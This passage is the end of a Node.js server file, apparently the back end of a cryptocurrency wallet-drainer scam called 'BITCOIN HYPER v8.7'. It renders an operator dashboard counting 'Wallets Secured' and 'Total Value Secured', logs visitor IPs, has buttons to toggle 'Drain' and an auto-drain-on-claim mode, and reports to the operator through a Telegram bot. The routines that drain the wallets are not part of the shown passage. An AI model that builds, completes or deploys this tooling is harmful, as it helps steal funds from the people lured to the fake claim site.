          <div class="stat-label">Total Value Secured</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.totalDrainedWallets}</div>
          <div class="stat-label">Wallets Secured</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.uniqueIPs.size}</div>
          <div class="stat-label">Unique Visitors</div>
        </div>
      </div>
      
      <div class="telegram-info">
        <h3>🤖 Telegram Status: ${telegramEnabled ? '✅ OPERATIONAL' : '❌ NOT WORKING'}</h3>
        <p>Bot: <strong>${telegramBotName ? '@' + telegramBotName : 'Not configured'}</strong></p>
        <p>Chat: <strong>${telegramChatTitle ? telegramChatTitle + ' (' + telegramChatType + ')' : 'Not verified'}</strong></p>
        
        ${!telegramEnabled ? `
          <div class="instructions">
            <h4>🚨 TELEGRAM FIX REQUIRED</h4>
            <p>Bot token is valid (@Gaccessbot) but can't send messages.</p>
            <p><strong>IMMEDIATE FIX:</strong></p>
            <ol style="text-align: left; margin-left: 20px;">
              <li>Open Telegram and start chat with <a href="https://t.me/Gaccessbot" target="_blank" style="color: #0088cc;">@Gaccessbot</a></li>
              <li>Send any message to the bot (Hello, Test, etc)</li>
              <li>Click "Test Telegram Connection" below</li>
              <li>If still fails, use @getidsbot to verify chat ID</li>
            </ol>
            <p><strong>Current Config:</strong><br>
            Bot: @Gaccessbot<br>
            Chat ID: ${process.env.TELEGRAM_CHAT_ID || 'Not set'}</p>
          </div>
        ` : ''}
      </div>
      
      <div class="actions">
        <button class="btn btn-telegram" onclick="testTelegram()">Test Telegram Connection</button>
        <button class="btn btn-success" onclick="resetTelegram()">Reset Telegram</button>
        <button class="btn ${memoryStorage.settings.drainEnabled ? 'btn-danger' : 'btn-success'}" onclick="toggleDrain()">${memoryStorage.settings.drainEnabled ? 'Disable Drain' : 'Enable Drain'}</button>
        <button class="btn btn-warning" onclick="clearData()">Clear All Data</button>
        <button class="btn btn-primary" onclick="location.reload()">Refresh Dashboard</button>
      </div>
      
      <div style="margin-top: 40px; text-align: center;">
        <p><a href="/api/admin/stats?token=${token}" target="_blank" style="color: #F7931A;">View Raw JSON Data</a> | 
        <a href="/api/health" target="_blank" style="color: #10b981;">Health Check</a></p>
      </div>
      
      <script>
        function testTelegram() {
          fetch('/api/test/telegram?token=${token}')
            .then(response => response.json())
            .then(data => {
              let message = data.message;
              if (data.immediateActions) {
                message += '\\n\\nImmediate Actions:';
                data.immediateActions.forEach(action => {
                  message += '\\n• ' + action;
                });
              }
              if (data.commonSolutions) {
                message += '\\n\\nCommon Solutions:';
                data.commonSolutions.forEach(solution => {
                  message += '\\n• ' + solution;
                });
              }
              alert(message);
              if (data.success || data.status === 'PARTIAL') {
                setTimeout(() => location.reload(), 2000);
              }
            })
            .catch(error => {
              alert('Error: ' + error.message);
            });
        }
        
        function resetTelegram() {
          if (confirm('Reset Telegram connection?')) {
            fetch('/api/admin/telegram/reset?token=${token}', { method: 'POST' })
              .then(response => response.json())
              .then(data => {
                alert(data.message);
                setTimeout(() => location.reload(), 1000);
              });
          }
        }
        
        function toggleDrain() {
          fetch('/api/admin/drain/toggle?token=${token}', { method: 'POST' })
            .then(response => response.json())
            .then(data => {
              alert(data.message);
              setTimeout(() => location.reload(), 1000);
            });
        }
        
        function clearData() {
          if (confirm('⚠️ WARNING: Clear ALL participant data?\\nThis cannot be undone!')) {
            fetch('/api/admin/clear?token=${token}', { method: 'POST' })
              .then(response => response.json())
              .then(data => {
                alert(data.message);
                setTimeout(() => location.reload(), 1000);
              });
          }
        }
        
        // Auto-refresh every 30 seconds
        setTimeout(() => location.reload(), 30000);
      </script>
    </body>
    </html>
  `);
});

// Start server
app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  🚀 BITCOIN HYPER v8.7
  =====================
  📍 Port: ${PORT}
  🔗 Health: http://localhost:${PORT}/api/health
  📊 Admin: http://localhost:${PORT}/admin?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
  🔍 Test Telegram: http://localhost:${PORT}/api/test/telegram?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
  💰 Drain: ${memoryStorage.settings.drainEnabled ? 'ACTIVE' : 'INACTIVE'}
  ⚡ Auto-Drain: ${memoryStorage.settings.autoDrainOnClaim ? 'ON' : 'OFF'}
  `);
  
  // Initialize Telegram with detailed logging
  console.log('\n📡 TELEGRAM INITIALIZATION:');
  console.log('   Bot Token: Found');
  console.log('   Chat ID: Found');
  
  await testTelegramConnection();
  
  if (telegramEnabled) {
    console.log(`\n✅ TELEGRAM READY:`);
    console.log(`   Bot: @${telegramBotName}`);
    console.log(`   Chat: ${telegramChatTitle} (${telegramChatType})`);
    console.log(`   Status: ✅ Operational\n`);
    
    // Send startup message
    try {
      await sendTelegramMessage('SYSTEM_START', {});
      console.log('   📨 Startup notification sent');
    } catch (e) {
      console.log('   ⚠️ Startup notification skipped');
    }
  } else {
    console.log('\n⚠️ TELEGRAM NOT WORKING:');
    console.log('   Bot: @Gaccessbot (Token valid)');
    console.log('   Issue: Cannot send to chat ID ${process.env.TELEGRAM_CHAT_ID}');
    console.log('\n🔧 QUICK FIX:');
    console.log('   1. Open Telegram and message @Gaccessbot');
    console.log('   2. Send any message to start chat');
    console.log('   3. Click "Test Telegram" in admin panel');
    console.log('   4. Or visit: https://t.me/Gaccessbot\n');
  }
  
  console.log('✅ Server is running and ready!\n');
});

module.exports = app;
